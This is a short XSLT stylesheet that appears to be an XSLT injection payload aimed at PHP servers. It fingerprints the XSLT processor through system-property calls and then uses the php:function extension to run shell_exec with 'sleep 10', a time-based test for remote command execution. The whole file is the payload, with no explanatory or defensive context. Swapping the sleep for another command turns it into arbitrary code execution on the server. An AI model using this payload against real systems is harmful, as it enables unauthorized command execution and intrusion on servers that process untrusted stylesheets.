<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://www.php.net/xsl">
    <xsl:output method="html"/>
    <xsl:template match="/">
      XSLT Version: <xsl:value-of select="system-property('xsl:version')"/>
      XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')"/>
      XSLT Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/>
      file: <xsl:value-of select="php:function('shell_exec', 'sleep 10')"/>
    </xsl:template>
  </xsl:stylesheet>
